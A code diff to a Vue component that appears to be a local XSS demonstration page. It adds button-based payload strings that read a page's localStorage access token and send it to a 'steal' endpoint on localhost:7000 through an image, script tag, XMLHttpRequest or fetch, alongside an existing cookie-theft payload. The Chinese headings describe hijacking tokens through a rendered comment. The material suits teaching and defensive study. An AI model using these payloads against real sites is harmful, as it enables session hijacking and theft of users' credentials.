@@ -25,7 +25,23 @@
             <span>{{ xssString }}</span>
           </p>
           <h3>输入{{ xssFetchCookie }}劫持cookie中的refreshToken</h3>
-          <h3>输入{{ xssFetchLocalStorage }}劫持cookie中的accessToken</h3>
+          <h3>
+            输入{{ xssFetchLocalStorageImg }}Img标签劫持cookie中的accessToken
+          </h3>
+
+          <h3>
+            输入{{ xssFetchLocalStorageJSONP }}JSONP劫持cookie中的accessToken
+          </h3>
+
+          <h3>
+            输入{{ xssFetchLocalStorageFetch }}Fetch劫持cookie中的accessToken
+          </h3>
+
+          <h3>
+            输入{{
+              xssFetchLocalStorageXML
+            }}通过XML或者Fetch劫持cookie中的accessToken
+          </h3>
           <h4>只要再在页面以透明的方式渲染出一条评论,这个token就被窃取了</h4>
           <textarea
             v-model="newComment"
@@ -54,8 +70,15 @@ export default {
         "<button onClick='console.log(localStorage);'>xssString</button>",
       xssFetchCookie:
         '<button onclick="const img = new Image(); img.src = `http://localhost:7000/steal?cookie=${document.cookie}`;">xssFetchCookie</button>',
-      xssFetchLocalStorage:
-        "<button onclick=\"const img = new Image(); img.src = `http://localhost:7000/steal?accessToken=${localStorage.getItem('accessToken')}`;\">xssFetchLocalStorage</button>",
+      xssFetchLocalStorageImg:
+        "<button onclick=\"const img = new Image(); img.src = `http://localhost:7000/steal?accessToken=${localStorage.getItem('accessToken')}`;\">xssFetchLocalStorageImg</button>",
+
+      xssFetchLocalStorageJSONP:
+        "<button onclick=\"const script = document.createElement('script'); script.src = `http://localhost:7000/steal?accessToken=${localStorage.getItem('accessToken')}`;document.body.appendChild(script);\">xssFetchLocalStorageScript</button>",
+      xssFetchLocalStorageXML:
+        "<button onclick=\"var xhr = new XMLHttpRequest(); xhr.open('GET', `http:\/\/localhost:7000/steal?accessToken=${localStorage.getItem('accessToken')}`); xhr.send(null);\">xssFetchLocalStorageXML</button>",
+      xssFetchLocalStorageFetch:
+        "<button onclick=\"fetch(`http:\/\/localhost:7000/steal?accessToken=${localStorage.getItem('accessToken')}`);\">xssFetchLocalStorageFetch</button>",
     };
   },
   methods: {
